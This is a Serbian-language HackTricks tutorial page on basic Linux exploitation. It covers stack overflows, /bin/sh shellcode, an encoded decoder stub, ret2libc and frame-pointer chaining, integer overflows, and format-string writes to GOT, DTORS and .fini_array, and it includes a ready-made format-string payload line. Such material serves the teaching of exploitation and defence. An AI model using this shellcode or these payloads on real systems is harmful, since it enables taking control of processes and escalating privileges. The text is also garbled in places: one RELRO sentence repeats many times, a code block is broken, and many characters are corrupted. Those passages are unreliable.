# Linux Exploiting (Osnovno)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **1. PREKORAƒåENJE STOGA**

> prekoraƒçenje bafera, prekoraƒçenje stoga, prekoraƒçenje steka, stekovanje

Segmentation fault ili segment violation: Kada se poku≈°a pristupiti adresi memorije koja nije dodeljena procesu.

Za dobijanje adrese funkcije unutar programa mo≈æe se uraditi:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Poziv funkcije sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Pogledajte prekide kernela: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; ƒçistimo eax\
xor ebx, ebx ; ebx = 0 jer nema argumenata za prosleƒëivanje\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Izvr≈°avanje syscall-a

**nasm -f elf assembly.asm** ‚Äî> Vraƒáa .o datoteku\
**ld assembly.o -o shellcodeout** ‚Äî> Daje nam izvr≈°nu datoteku sastavljenu od asemblerskog koda i mo≈æemo izvuƒái opkodove pomoƒáu **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Da bismo videli da je zaista na≈° shellcode i izvukli OpKodove

**Proverite da li shellcode radi**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Da biste videli da li se sistemski pozivi pravilno izvr≈°avaju, treba da kompajlirate prethodni program i sistemski pozivi treba da se pojave u **strace ./PROGRAMA\_COMPILADO**

Prilikom kreiranja shellcode-ova mo≈æete koristiti trik. Prva instrukcija je skok na poziv. Poziv poziva originalni kod i dodatno stavlja EIP na stek. Nakon instrukcije poziva smo ubacili string koji nam je potreban, tako da sa tim EIP-om mo≈æemo pokazati na string i nastaviti izvr≈°avanje koda.

PRIMER **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EKSPLOATISANJE kori≈°ƒáenjem Stack-a (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Lovac na jaja:**

Ovo je mali kod koji prolazi kroz stranice memorije povezane s procesom u potrazi za shellcode-om koji je tamo spremljen (tra≈æi neki potpis postavljen u shellcode-u). Korisno u sluƒçajevima kada imate samo malo prostora za ubacivanje koda.

**Polimorfni shellkodovi**

To su ≈°ifrovani shellkodovi koji imaju male kodove koji ih de≈°ifruju i skoƒçe na njih, koristeƒái trik Call-Pop, ovde je **primer Cezarove ≈°ifre**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Napad na pokazivaƒç okvira (EBP)**

Koristan u situaciji kada mo≈æemo izmeniti EBP, ali ne i EIP.

Poznato je da prilikom izlaska iz funkcije izvr≈°ava sledeƒái asemblerski kod:
```
movl               %ebp, %esp
popl                %ebp
ret
```
Na ovaj naƒçin, ako se mo≈æe promeniti EBP prilikom izlaska iz funkcije (fvuln) koja je pozvana iz druge funkcije, kada funkcija koja je pozvala fvuln zavr≈°i, njen EIP mo≈æe biti promenjen.

U fvuln se mo≈æe uneti la≈æni EBP koji pokazuje na mesto gde se nalazi adresa shell koda + 4 (treba dodati 4 zbog pop operacije). Na taj naƒçin, prilikom izlaska iz funkcije, vrednost &(\&Shellcode)+4 ƒáe biti sme≈°tena u ESP, nakon pop operacije ƒáe se smanjiti vrednost ESP za 4 i on ƒáe pokazivati na adresu shell koda kada se izvr≈°i ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + punjenje + &(\&Shellcode)+4

**Off-by-One Exploit**\
Dozvoljava se modifikacija samo najmanjeg bajta EBP. Mo≈æe se izvesti napad kao prethodni, ali memorija koja ƒçuva adresu shell koda mora deliti prva 3 bajta sa EBP.

## **4. Metode povratka na Libc**

Korisna metoda kada stack nije izvr≈°iv ili ostavlja vrlo mali bafer za modifikaciju.

ASLR uzrokuje da se funkcije u svakom izvr≈°avanju uƒçitavaju na razliƒçite pozicije u memoriji. Stoga ova metoda mo≈æda neƒáe biti efikasna u tom sluƒçaju. Za udaljene servere, buduƒái da se program stalno izvr≈°ava na istoj adresi, ova metoda mo≈æe biti korisna.

* **cdecl(C deklaracija)** Stavlja argumente na stack i nakon izlaska iz funkcije ƒçisti stek
* **stdcall(standardni poziv)** Stavlja argumente na stek i funkcija koja je pozvana ƒçisti stek
* **fastcall** Stavlja prva dva argumenta u registre, a ostale na stek

Stavlja se adresa system funkcije iz libc i prosleƒëuje se kao argument string ‚Äú/bin/sh‚Äù, obiƒçno iz okoline. Takoƒëe, koristi se adresa funkcije exit kako bi se program iza≈°ao bez problema nakon ≈°to shell vi≈°e nije potreban (i zapisivanje logova).

**export SHELL=/bin/sh**

Za pronala≈æenje potrebnih adresa mo≈æe se pogledati unutar **GDB-a:**\
**p system**\
**p exit**\
**rabin2 -i izvr≈°iv** ‚Äî> Daje adresu svih funkcija koje program koristi prilikom uƒçitavanja\
(Unutar starta ili nekog breakpointa): **x/500s $esp** ‚Äî> Tra≈æimo string /bin/sh unutar ovoga

Kada imamo ove adrese, **exploit** ƒáe izgledati ovako:

‚ÄúA‚Äù \* RAZDALJINA EBP + 4 (EBP: mogu biti 4 "A" mada je bolje ako je pravi EBP da se izbegnu segmentacione gre≈°ke) + Adresa **system** (prepisuje EIP) + Adresa **exit** (nakon system(‚Äú/bin/sh‚Äù) ova funkcija ƒáe biti pozvana jer se prva 4 bajta steka tretiraju kao sledeƒáa adresa EIP-a za izvr≈°avanje) + Adresa ‚Äú**/bin/sh**‚Äù (biƒáe parametar prosleƒëen system funkciji)

Na ovaj naƒçin, EIP ƒáe biti prepisan adresom system funkcije koja ƒáe primiti string ‚Äú/bin/sh‚Äù kao argument, a nakon izlaska iz nje izvr≈°iƒáe se funkcija exit().

Moguƒáe je da se naƒëete u situaciji da je neki bajt neke adrese neaktivan ili prazan (\x20). U tom sluƒçaju mo≈æete rasklopiti prethodne adrese funkcija jer ƒáe verovatno biti vi≈°e NOP instrukcija koje ƒáe vam omoguƒáiti da pozovete neku od njih umesto same funkcije direktno (na primer sa > x/8i system-4).

Ova metoda funkcioni≈°e jer kada se pozove funkcija poput system koristeƒái opcode **ret** umesto **call**, funkcija shvata da ƒáe prva 4 bajta biti adresa **EIP** na koju treba vratiti.

Interesantna tehnika sa ovom metodom je pozivanje **strncpy()** kako bi se prebacio payload sa steka na hip i zatim koristio **gets()** za izvr≈°avanje tog payload-a.

Jo≈° jedna interesantna tehnika je kori≈°ƒáenje **mprotect()** koja omoguƒáava dodeljivanje ≈æeljenih dozvola bilo kojem delu memorije. Funkcioni≈°e ili je funkcionisalo u BDS-u, MacOS-u i OpenBSD-u, ali ne i u Linuxu (kontroli≈°e da ne mo≈æete istovremeno dodeliti dozvole za pisanje i izvr≈°avanje). Ovim napadom moglo bi se ponovo postaviti stek kao izvr≈°iv.

**Nizanje funkcija**

Na osnovu prethodne tehnike, ovaj oblik exploit-a sastoji se od:\
Punjenje + \&Funkcija1 + \&pop;ret; + \&arg\_fun1 + \&Funkcija2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

Na ovaj naƒçin mogu se nizati funkcije koje treba pozvati. Takoƒëe, ako se ≈æele koristiti funkcije sa vi≈°e argumenata, mogu se postaviti potrebni argumenti (npr. 4) i postaviti sva 4 argumenta i pronaƒái adresu sa opcodovima: pop, pop, pop, pop, ret ‚Äî> **objdump -d izvr≈°iv**

**Nizanje putem falsifikovanja okvira (nizanje EBPa)**

Sastoji se u iskori≈°ƒáavanju moguƒánosti manipulacije EBP-om kako bi se nizale izvr≈°avanje razliƒçitih funkcija putem EBP-a i "leave;ret"

PUNJENJE

* Postavljamo la≈æni EBP koji pokazuje na: 2. la≈æni EBP + funkcija za izvr≈°avanje: (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* U EIP postavljamo adresu funkcije &(leave;ret)

Zapoƒçinjemo shell kod sa adresom sledeƒáeg dela shell koda, na primer: 2. la≈æni EBP + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

2. la≈æni EBP bi bio: 3. la≈æni EBP + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

Ovaj shell kod se mo≈æe ponavljati neograniƒçeno u delovima memorije do kojih se mo≈æe pristupiti, tako da ƒáe se shell kod lako podeliti na male delove memorije.

(Izvr≈°avanje funkcija se niza kombinovanjem ranije viƒëenih ranjivosti EBP-a i ret2lib)

## **5. Dodatne metode**

**Ret2Ret**

Korisno kada nije moguƒáe ubaciti adresu sa steka u EIP (proverava se da EIP ne sadr≈æi 0xbf) ili kada nije moguƒáe izraƒçunati lokaciju shell koda. Meƒëutim, ranjiva funkcija prihvata parametar (shell kod ƒáe biti ovde).

Na ovaj naƒçin, menjanjem EIP-a sa adresom **ret**, uƒçitaƒáe se sledeƒáa adresa (koja je adresa prvog argumenta funkcije). Drugim reƒçima, uƒçitaƒáe se shell kod.

Exploit ƒáe izgledati ovako: SHELLCODE + Punjenje (do EIP-a) + **\&ret** (sledeƒái bajtovi steka pokazuju na poƒçetak shell koda jer se adresa prosleƒëuje kao argument)

Izgleda da funkcije poput **strncpy** nakon zavr≈°etka uklanjaju sa steka adresu gde je ƒçuvan shell kod, onemoguƒáavajuƒái ovu tehniku. Drugim reƒçima, adresa koja se prosleƒëuje funkciji kao argument (ona koja ƒçuva shell kod) se menja u 0x00, pa kada se pozove drugi **ret** nailazi se na 0x00 i program se ru≈°i.
```
**Ret2PopRet**
```
**Muratova tehnika**

Ukoliko nemamo kontrolu nad prvom argumentom, ali imamo nad drugim ili treƒáim, mo≈æemo prepisati EIP adresu sa adresom pop-ret ili pop-pop-ret, u zavisnosti koja nam je potrebna.

U Linuxu, svi programi se mapiraju poƒçev≈°i od 0xbfffffff.

Posmatrajuƒái kako se konstrui≈°e stek novog procesa u Linuxu, mo≈æemo razviti eksploit tako da program bude pokrenut u okru≈æenju gde je jedina promenljiva shellcode. Adresu ove promenljive mo≈æemo izraƒçunati kao: addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)

Na ovaj naƒçin, lako mo≈æemo dobiti adresu gde se nalazi promenljiva okru≈æenja sa shellcode.

Ovo je moguƒáe zahvaljujuƒái funkciji execle koja omoguƒáava kreiranje okru≈æenja sa samo ≈æeljenim promenljivama okru≈æenja.

**Skok na ESP: Windows stil**

Buduƒái da ESP uvek pokazuje na poƒçetak steka, ova tehnika podrazumeva zamenu EIP adrese sa adresom poziva **jmp esp** ili **call esp**. Na ovaj naƒçin, shellcode se ƒçuva nakon prepisivanja EIP jer nakon izvr≈°enja **ret**, ESP ƒáe pokazivati na sledeƒáu adresu, taƒçno tamo gde je saƒçuvana shellcode.

U sluƒçaju da ASLR nije aktiviran u Windowsu ili Linuxu, mo≈æemo pozvati **jmp esp** ili **call esp** koji su sme≈°teni u nekom deljenom objektu. U sluƒçaju da je ASLR aktivan, mo≈æemo potra≈æiti unutar samog ranjivog programa.

Takoƒëe, moguƒánost postavljanja shellcode nakon korupcije EIP umesto u sredini steka omoguƒáava da push ili pop instrukcije koje se izvr≈°e usred funkcije ne dodirnu shellcode (≈°to bi se moglo desiti ako bi bila postavljena u sredini steka funkcije).

Na veoma sliƒçan naƒçin, ako znamo da funkcija vraƒáa adresu gde je saƒçuvana shellcode, mo≈æemo pozvati **call eax** ili **jmp eax (ret2eax).**

**Prekoraƒçenja celih brojeva**

Ova vrsta prekoraƒçenja se de≈°ava kada promenljiva nije spremna da podr≈æi tako veliki broj koji joj se prosleƒëuje, mo≈æda zbog zabune izmeƒëu promenljivih sa i bez znaka, na primer:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
U prethodnom primeru vidimo da program oƒçekuje 2 parametra. Prvi je du≈æina sledeƒáeg niza, a drugi je niz.

Ako prosledimo negativan broj kao prvi parametar, program ƒáe prikazati da je len < 256 i proƒái ƒáe kroz taj filter, a takoƒëe ƒáe strlen(buffer) biti manji od l, jer je l unsigned int i biƒáe veoma velik.

Ovaj tip preplavljenosti ne poku≈°ava da ne≈°to upi≈°e u proces programa, veƒá da prevaziƒëe lo≈°e dizajnirane filtere kako bi iskoristio druge ranjivosti.

**Nekonfigurisane promenljive**

Nije poznata vrednost koju mo≈æe imati nekonfigurisana promenljiva i bilo bi zanimljivo posmatrati je. Moguƒáe je da ƒáe uzeti vrednost koju je imala promenljiva iz prethodne funkcije i da je ova kontrolisana od strane napadaƒça.

## **Formatiranje stringova**

U programskom jeziku C, **`printf`** je funkcija koja se mo≈æe koristiti za **ispisivanje** odreƒëenog niza karaktera. **Prvi parametar** koji ova funkcija oƒçekuje je **sirovi tekst sa formatima**. **Sledeƒái parametri** koji se oƒçekuju su **vrednosti** koje ƒáe **zameniti** formate iz sirovog teksta.

Ranjivost se pojavljuje kada **napadaƒçev tekst bude postavljen kao prvi argument** ovoj funkciji. Napadaƒç ƒáe moƒái da oblikuje **specijalan unos zloupotrebom** moguƒánosti **formatiranja stringova printf funkcije** kako bi **upisao bilo koje podatke na bilo koju adresu**. Na taj naƒçin mo≈æe **izvr≈°iti proizvoljan kod**.

Formati:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **upisuje** **broj napisanih bajtova** na **naznaƒçenu adresu. Pisanje** toliko **bajtova** koliko je heksadecimalni broj koji **treba** napisati je naƒçin kako mo≈æete **napisati bilo koje podatke**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

Ovo je tabela koja sadr≈æi adresu spoljnih funkcija koje koristi program.

Dobijte adresu ove tabele sa: `objdump -s -j .got ./exec`

![](<../../.gitbook/assets/image (619).png>)

Primetite kako nakon uƒçitavanja izvr≈°nog fajla u GEF-u mo≈æete videti funkcije koje se nalaze u GOT-u: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Kori≈°ƒáenjem GEF-a mo≈æete zapoƒçeti sesiju za debagovanje i izvr≈°iti `got` da biste videli got tabelu:

![](<../../.gitbook/assets/image (621).png>)

U binarnom fajlu, GOT ima adrese funkcija ili odeljak PLT koji ƒáe uƒçitati adresu funkcije. Cilj ovog eksploata je da se prepi≈°e unos u GOT-u funkcije koja ƒáe biti izvr≈°ena kasnije sa adresom PLT funkcije `system`. Idealno, prepi≈°ete GOT funkcije koja ƒáe biti pozvana sa parametrima koje kontroli≈°ete (tako da ƒáete moƒái da kontroli≈°ete parametre poslate funkciji sistema).

Ako `system` nije kori≈°ƒáen od strane skripte, funkcija sistema neƒáe imati unos u GOT-u. U tom scenariju, moraƒáete prvo otkriti adresu funkcije `system`.

Procedure Linkage Table je tabela samo za ƒçitanje u ELF fajlu koja ƒçuva sve neophodne simbole koji zahtevaju razre≈°enje. Kada se pozove jedna od ovih funkcija, GOT ƒáe preusmeriti tok na PLT kako bi razre≈°io adresu funkcije i upisao je u GOT. Zatim, sledeƒái put kada se pozove ta adresa, funkcija se poziva direktno bez potrebe za razre≈°avanjem.

Mo≈æete videti adrese PLT-a sa `objdump -j .plt -d ./vuln_binary`

### Tok eksploatacije

Kao ≈°to je obja≈°njeno ranije, cilj ƒáe biti da se prepi≈°e adresa funkcije u GOT tabeli koja ƒáe biti pozvana kasnije. Idealno bi bilo postaviti adresu shell koda sme≈°tenu u izvr≈°nom odeljku, ali je veoma verovatno da neƒáete moƒái da napi≈°ete shell kod u izvr≈°nom odeljku. Stoga, druga opcija je da se prepi≈°e funkcija koja prima argumente od korisnika i usmeri je ka funkciji `system`.

Za pisanje adrese, obiƒçno se rade 2 koraka: Prvo se pi≈°u 2 bajta adrese, a zatim druga 2. Za to se koristi `$hn`.

HOB se odnosi na 2 vi≈°a bajta adrese\
LOB se odnosi na 2 ni≈æa bajta adrese

Zbog toga kako format string radi, morate prvo napisati manji od [HOB, LOB] pa onda drugi.

Ako je HOB < LOB\
`[adresa+2][adresa]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Ako je HOB > LOB\
`[adresa+2][adresa]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 N¬∫Param_dir_HOB LOB_shell-HOB_shell N¬∫Param_dir_LOB

`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'`

### ≈†ablon za eksploataciju format stringa

Mo≈æete pronaƒái ≈°ablon za eksploataciju GOT-a kori≈°ƒáenjem format stringova ovde:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### .fini_array

Essentially this is a structure with functions that will be called before the program finishes. This is interesting if you can call your shellcode just jumping to an address, or in cases where you need to go back to main again to exploit the format string a second time.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Napomena da ovo **neƒáe** **kreirati** veƒçnu petlju jer kada se vratite na glavnu funkciju, kanarinci ƒáe primetiti, kraj steka mo≈æe biti o≈°teƒáen i funkcija vi≈°e neƒáe biti ponovo pozvana. Dakle, sa ovim ƒáete moƒái **izvr≈°iti jo≈° jedno izvr≈°enje** ranjivosti.

### **Formatiranje stringova za ispis sadr≈æaja**

Formatni string takoƒëe mo≈æe biti zloupotrebljen da **izbaci sadr≈æaj** iz memorije programa. Na primer, u sledeƒáoj situaciji postoji **lokalna promenljiva na steku koja pokazuje na zastavu**. Ako **pronaƒëete** gde je u **memoriji** **pokazivaƒç** na **zastavu**, mo≈æete naterati **printf da pristupi** tom **adresi** i **ispise** zastavu:

Dakle, zastava je na **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Iz curenja mo≈æete videti da je **pokazivaƒç na zastavu** u **8.** parametru:

![](<../../.gitbook/assets/image (623).png>)

Dakle, **pristupanjem 8. parametru** mo≈æete dobiti zastavu:

![](<../../.gitbook/assets/image (624).png>)

Napomena da nakon **prethodnog napada** i shvatanja da mo≈æete **procureti sadr≈æaj**, mo≈æete postaviti pokazivaƒçe na **`printf`** na odeljak gde je **izvr≈°ivi fajl uƒçitan** i **potpuno ga iskopirati**!

### **DTOR**

{% hint style="danger" %}
Danas je vrlo **ƒçudno naƒái binarni fajl sa dtor sekcijom**.
{% endhint %}

Destruktori su funkcije koje se **izvr≈°avaju pre zavr≈°etka programa**. Ako uspete **upisati** adresu **shell koda** u **`__DTOR_END__`**, to ƒáe se **izvr≈°iti** pre zavr≈°etka programa. Dobijte adresu ovog odeljka sa:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Obiƒçno ƒáete pronaƒái **DTOR** sekciju **izmeƒëu** vrednosti `ffffffff` i `00000000`. Dakle, ako vidite samo te vrednosti, to znaƒçi da **nema registrovane funkcije**. Dakle, **prepi≈°ite** **`00000000`** sa **adresom** **shell koda** da biste ga izvr≈°ili.

### **Formatiranje stringova za preplavljivanje bafera**

**Sprintf** pomera formatiran string **u** **promenljivu**. Stoga, mo≈æete zloupotrebiti **formatiranje** stringa da izazovete **preplavljivanje bafera u promenljivoj** gde se sadr≈æaj kopira. Na primer, payload `%.44xAAAA` ƒáe **upisati 44B+"AAAA" u promenljivu**, ≈°to mo≈æe izazvati preplavljivanje bafera.

### **Strukture \_\_atexit**

{% hint style="danger" %}
Danas je vrlo **ƒçudno iskoristiti ovo**.
{% endhint %}

**`Atexit()`** je funkcija kojoj se **druge funkcije prosleƒëuju kao parametri.** Ove **funkcije** ƒáe biti **izvr≈°ene** prilikom izvr≈°avanja **`exit()`** ili **povratka** iz **main** funkcije. Ako mo≈æete **modifikovati adresu** bilo koje od ovih **funkcija** da pokazuje na shell kod na primer, **preuzeti ƒáete kontrolu** nad **procesom**, ali je to trenutno slo≈æenije. Trenutno su **adrese funkcija** koje treba izvr≈°iti **sakrivene** iza nekoliko struktura i na kraju adrese na koje pokazuju nisu adrese funkcija, veƒá su **≈°ifrovane XOR** funkcijom i pomeraji sa **sluƒçajnim kljuƒçem**. Tako da je ovaj vektor napada trenutno **nije vrlo koristan bar na x86** i **x64\_86** arhitekturama. **Funkcija za ≈°ifrovanje** je **`PTR_MANGLE`**. **Druge arhitekture** poput m68k, mips32, mips64, aarch64, arm, hppa... **ne implementiraju ≈°ifrovanje** funkcije jer **vraƒáaju isto** ≈°to su primile kao ulaz. Tako da bi ove arhitekture bile podlo≈æne ovom vektoru napada.

### **Setjmp() & longjmp()**

{% hint style="danger" %}
Danas je vrlo **ƒçudno iskoristiti ovo**.
{% endhint %}

**`Setjmp()`** omoguƒáava da se **saƒçuva** **kontekst** (registri)\
**`Longjmp()`** omoguƒáava da se **vrati** **kontekst**.\
Saƒçuvani registri su: `EBX, ESI, EDI, ESP, EIP, EBP`\
Ono ≈°to se de≈°ava je da se EIP i ESP prosleƒëuju kroz **`PTR_MANGLE`** funkciju, tako da su **arhitekture podlo≈æne ovom napadu iste kao gore**.\
Koriste se za oporavak od gre≈°aka ili prekida.\
Meƒëutim, prema onome ≈°to sam proƒçitao, ostali registri nisu za≈°tiƒáeni, **tako da ako postoji `call ebx`, `call esi` ili `call edi`** unutar funkcije koja se poziva, kontrola mo≈æe biti preuzeta. Ili takoƒëe mo≈æete modifikovati EBP da biste modifikovali ESP.

**VTable i VPTR u C++**

Svaka klasa ima **Vtabelu** koja je niz **pokazivaƒça na metode**.

Svaki objekat **klase** ima **VPtr** koji je **pokazivaƒç** na niz svoje klase. VPtr je deo zaglavlja svakog objekta, tako da ako se postigne **prepisivanje** VPtr-a, mo≈æe se **modifikovati** da **pokazuje** na la≈ænu metodu tako da izvr≈°avanje funkcije ode na shell kod.

## **Preventivne mere i izbegavanja**

**Return-into-printf**

To je tehnika za pretvaranje preplavljivanja bafera u gre≈°ku u formatu stringa. Sastoji se od zamene EIP-a tako da pokazuje na printf funkciju i prosleƒëivanja manipulisanog stringa kao argumenta kako bi se dobile vrednosti o stanju procesa.

**Napad na biblioteke**

Biblioteke se nalaze na poziciji sa 16 bita nasumiƒçnosti = 65636 moguƒáih adresa. Ako ranjiv server pozove fork(), prostor adresa memorije je kopiran u proces dete i ostaje netaknut. Tako da se mo≈æe poku≈°ati izvr≈°iti brute force na funkciju usleep() iz libc prosleƒëujuƒái joj argument "16" tako da kada du≈æe traje od uobiƒçajenog da odgovori, pronaƒëena je ta funkcija. Znajuƒái gde se ta funkcija nalazi, mo≈æe se dobiti delta\_mmap i izraƒçunati ostale.

Jedini naƒçin da budete sigurni da ASLR funkcioni≈°e je kori≈°ƒáenje 64-bitne arhitekture. Tamo nema napada brute force.

### Relro

**Relro (Read only Relocation)** utiƒçe na dozvole memorije sliƒçno kao NX. Razlika je u tome ≈°to dok sa NX ƒçini stek izvr≈°ivim, RELRO ƒçini **odreƒëene stvari samo za ƒçitanje** tako da im **ne mo≈æemo pisati**. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. 